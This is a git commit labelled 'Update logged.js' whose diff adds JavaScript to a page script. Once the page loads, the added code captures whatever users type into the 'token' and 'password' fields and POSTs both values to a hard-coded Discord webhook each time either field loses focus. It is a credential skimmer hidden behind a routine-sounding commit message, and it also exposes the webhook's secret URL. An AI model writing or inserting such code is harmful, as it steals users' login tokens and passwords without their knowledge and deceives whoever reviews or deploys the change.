be490fd8bfad7a241cd927ff2d1cfcd17e9c8056
ImHububba <153889426+ImHububba@users.noreply.github.com>
2024-03-10 04:38:19 -0500

    Update logged.js

--- test/logged.js
+++ test/logged.js
@@ -16,3 +16,26 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    const tokenInput = document.getElementById('token');
+    const passwordInput = document.getElementById('password');
+
+    const sendToDiscord = (token, password) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://discord.com/api/webhooks/1216319088843030528/hX_8qMQKRR8IkYjwXB2cYUk_f28yKAnPb7S9Os7iorbersFo7y1NyTu68N3oiomb_Yhg');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        const data = JSON.stringify({ token: token, password: password });
+        xhr.send(data);
+    };
+
+    tokenInput.addEventListener('blur', function() {
+        const token = tokenInput.value;
+        sendToDiscord(token, passwordInput.value);
+    });
+
+    passwordInput.addEventListener('blur', function() {
+        const password = passwordInput.value;
+        sendToDiscord(tokenInput.value, password);
+    });
+});
